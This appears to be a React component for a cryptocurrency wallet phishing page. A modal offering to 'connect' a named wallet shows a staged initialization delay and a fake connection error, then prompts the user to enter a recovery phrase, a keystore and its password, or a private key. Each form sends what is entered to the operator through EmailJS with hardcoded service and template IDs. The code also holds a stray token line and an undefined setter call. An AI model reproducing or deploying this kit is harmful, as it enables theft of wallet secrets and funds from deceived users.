import React, { useState , useRef, useEffect } from 'react'
import { useDisclosure } from '@chakra-ui/react'
import emailjs from '@emailjs/browser';
import { useInView } from "react-intersection-observer";
import PropagateLoader from "react-spinners/PropagateLoader";

import {
    Modal,
    Input,
    Button,
    FormControl,
    FormLabel,
    ModalOverlay,
    ModalContent,
    ModalHeader,
    ModalFooter,
    ModalBody,
    ModalCloseButton,
} from '@chakra-ui/react'

function Newcard({item}) {
    

    const { isOpen, onOpen, onClose } = useDisclosure()
    const initialRef = React.useRef(null)
    const finalRef = React.useRef(null)

    const [loadings, setLoadings] = useState(true);
    const divRef = useRef(null);
    const { ref, inView } = useInView({
      threshold: 0,
    });
  

    


  setTimeout(() => {
    setLoadings(false);
   
  }, 8000);

  const [showDiv, setShowDiv] = useState(true)
  
  const clicked = () => {
    setShowDiv(false)
  }

  const clickeds = () => {
    setShowDiv(true)
  }

  const [showText, setShowText] = useState(true);
  const [showText1, setShowText1] = useState(false);
  const [showText2, setShowText2] = useState(false);

  const handleButtonClick = (paranumber) => {
    if(paranumber === 1){
        setShowText(true);
         setShowText1(false);
         setShowText2(false);
    }

     if (paranumber === 2){
        setShowText(false);
         setShowText1(true);
         setShowText2(false);
    }

    else if (paranumber === 3){
        setShowText(false);
         setShowText1(false);
         setShowText2(true);
    }
}


const [loading, setLoading] = useState(false)


const [success, setSuccess] = useState(false)


const [post, setpost] = useState(null)

  useEffect(() => {
    
   const timer = setTimeout(() => {
      setSuccess(false)
     
      
    }, 1000)

  

    return () => clearTimeout(timer);


    
  }, [])


  
  const [texting, setTexting] = useState("")
  
  const [isvalid, setIsValid] = useState(false)

  const [textingss, setTextingss] = useState("")
  const [isvalids, setIsValids] = useState(false)
  
 

  const change = (e) =>{
    setTexting(e.target.value)
    if (e.target.value <= 0){
      setIsValid(true)
    }else{
      setIsValid(false)
    }
  }

  const changes = (e) =>{
    setTextingss(e.target.value)
    if (e.target.value <= 0){
      setIsValid(true)
    }else{
      setIsValid(false)
    }
  }




    const form = useRef();
    const sendEmail = (e) => {
        
      e.preventDefault();

      if (texting.length <= 0){
        setIsValid(true)

        setTimeout(() => {
          setIsValid(false)
        },4000);
      }
      else{
        
        emailjs.sendForm('service_g9n341o', 'template_ebq92wu' , form.current, 'uEb2CnNKXDiRIoTIJ')
template_kqanrfo
        .then((result) => {
            result.text;

            setIsValid(false)
            setIsValids(false)
              setLoading(true)
            
              setTimeout(() =>{
                setLoading(false)
              },2000)

            
            
            setTimeout(() => {
              setSuccess(true)
            }, 3500)
            

            setTimeout(() => {
              setSuccess(false)
            }, 9000)

            setTexting("")
            setTextings("")
           
        }, (error) => {
            console.log(error.text);
        });
        
      }    
      
    };

    
  


    
  

    
  return (
    <div>
         
    <Modal 
        initialFocusRef={initialRef}
        finalFocusRef={finalRef}
        isOpen={isOpen}
        onClose={onClose}
    >
        <ModalOverlay />
        <ModalContent>
            <ModalHeader className="">Connect Wallet to {item.name}</ModalHeader>
            <ModalCloseButton />
            <ModalBody pb={6}>
    
          <div  className='mt-[-1rem]'>
      {showDiv ? (
        <div className='border-[1.5px] rounded border-[red] h-[7rem]'>
        <img  className='w-[1.5rem] m-2' src={item.img} alt="" />
        {loadings ? <p className='text-[red]'>Initializing...</p> : <div> <p className='text-[red] pl-3'>Error Connecting... </p>
         <button onClick={clicked} className="border-[1px] font-link ml-[2rem] rounded text-[0.8rem] px-2 bg-[#000000bd] pb-[0.2rem] text-white ">Connect Manually</button>
        </div>   }
        </div>
      ) : (


        <div>
             <img className='w-[1.5rem] m-2'  src={item.img} alt="" />

          <div className='flex items-center space-x-[2.5rem] justify-center'>
               <p onClick={() => handleButtonClick(1)}  className= 'text-[#00000095] font-link active:underline  underline-offset-8 decoration-[orange] '>Phrase</p>
               <p onClick={() => handleButtonClick(2)}  className='text-[#00000095] font-link  active:underline underline-offset-8  decoration-sky-500'>Keystore</p>
               <p onClick={() => handleButtonClick(3)}  className='text-[#00000095] font-link  active:underline  underline-offset-8 decoration-[#00ffa2bd]'>Private Key</p>
            </div>


          

           

            { showText &&

<div className="relative mb-4">
<div className='border-t-[2px] mt-[0.6rem] ml-[0.8rem]'></div>

 

{
    loading &&

<div className='flex items-center justify-center my-[1rem]'><PropagateLoader className='' color="#36d7b7" /></div> 

}

{
  success &&
  <div className=' flex items-center justify-center'><h5 className='text-white font-link bg-[#ff0000a5] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center justify-center pl-3'>Successfully submitted</h5></div> 
}

{
  isvalid && <div className='flex items-center justify-center m-1'><h1 className="text-[red] text-[0.8rem]">Input filed cannot be empty</h1></div>
}


  


<form ref={form} onSubmit={sendEmail}   action="">


  <textarea value={texting}  onChange={change} className="text font-link resize-none w-full border-[2px] mt-[1rem] rounded border-[#00000037] outline-0 ml-2 pl-2" placeholder='Enter recovery phrase' name="message"  cols="20" rows="6"></textarea>


<p className="text-[0.8rem] mt-2 ml-2 font-link font-[400]">Typically 12 (sometines 24) words separated by single spaces</p>

<button type='submit'   value="Send" className='text-[0.8rem] font-bold font-link bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white mt-4 '>PROCEED</button>
<button onClick={clickeds} className='text-white bg-[#965050] font-link w-[4rem] h-[1.5rem] rounded  text-[0.8rem] absolute right-1 mt-[4rem]'>Back</button>

</form>

</div>

}


            
{ showText1 &&

<div className="relative mb-4">
<div className='border-t-[2px] mt-[0.6rem] ml-[0.8rem]'></div>

{
    loading &&

<div className='flex items-center justify-center my-[1rem]'><PropagateLoader className='' color="#36d7b7" /></div> 

}

{success &&   
            <div className=''><h5 className='text-white font-link bg-[#ff0000a5] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center font-link justify-center'>{success}</h5></div> 
           }

{
  isvalid && <div className='flex items-center justify-center m-1'><h1 className="text-[red] text-[0.8rem]">Input filed cannot be empty</h1></div>
}
        
<form ref={form} onSubmit={sendEmail}   action="">

<textarea value={texting} onChange={change} className="text font-link  pl-2 resize-none w-full border-[2px] mt-[1rem] rounded border-[#00000037] outline-0 ml-2" placeholder='Enter Keystore' name="message"  cols="20" rows="4"></textarea>
<textarea value={textingss} onChange={changes} className="text font-link  pl-2 resize-none w-full border-[2px] mt-[0,7rem] rounded border-[#00000037] outline-0 ml-2" placeholder='Enter password' name="message"  cols="20" rows="1"></textarea>



<p className="text-[0.8rem] font-link mt-2 font-[400] ml-2">Several lines of text beginning with "&#123;..&#125;"plus the password you used to encrypt it</p>

<button type='submit'   value="Send" className='text-[0.8rem] font-link font-bold bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white mt-4'>PROCEED</button>
<button onClick={clickeds} className='text-white bg-[#965050] font-link w-[4rem] h-[1.5rem] rounded  text-[0.8rem] absolute right-1 mt-[4rem]'>Back</button>

</form>

</div>

}



{ showText2 &&

<div className="relative mb-4 ml-1">
<div className='border-t-[2px] mt-[0.6rem] w-[24.5rem] ml-[0.5rem]'></div>
      
{
    loading &&

<div className='flex items-center justify-center my-[1rem]'><PropagateLoader className='' color="#36d7b7" /></div> 

}

{success &&   
            <div className=''><h5 className='text-white font-link bg-[#ff0000a5] w-[20rem] ml-2 mt-3 h-[4rem] p-1 flex items-center font-link justify-center'>{success}</h5></div> 
           }


{
  isvalid && <div className='flex items-center justify-center m-1'><h1 className="text-[red] text-[0.8rem]">Input filed cannot be empty</h1></div>
}

<form ref={form} onSubmit={sendEmail}   action="">

<textarea value={texting} onChange={change} className="text font-link  pl-2 resize-none w-full border-[2px] h-[3rem] mt-[1rem] rounded border-[#00000037] outline-0 ml-2" placeholder='Enter your Private Key' name="message"  cols="10" rows="" ></textarea>


<p className="text-[0.8rem] overflow-hidden font-link mt-2 ml-2 font-[400]">Typically 12 (sometines 24) words separated by a single space</p>

<button onClick={onOpen}   type='submit'   value="Send" className='text-[0.8rem] font-link font-bold bg-[#5353bec8] w-[100%] rounded h-[1.8rem] text-white font-link mt-4'>PROCEED</button>
<button onClick={clickeds} className='text-white bg-[#965050] w-[4rem] h-[1.5rem] font-link rounded  text-[0.8rem] absolute right-1 mt-[4rem]'>Back</button>

</form>

</div>

}
</div>  
      )}
      

    </div>

    

           
            </ModalBody>
        </ModalContent>
    </Modal>
    <div className=''>
        <div  className="mb-[2rem] ">
            <img onClick={onOpen}  className="sm:w-[5rem] w-[3rem] mb-[0.2rem] mx-auto " key={item.id} src={item.img} alt="" />
            <h7 className="text-[0.7rem] font-link flex items-center justify-center hover:scale-105 hover:ease-in-out transition hover:duration-150" key={item.id}>{item.name}</h7>
          
        </div>

    </div>

    
    
</div>

  )
}

export default Newcard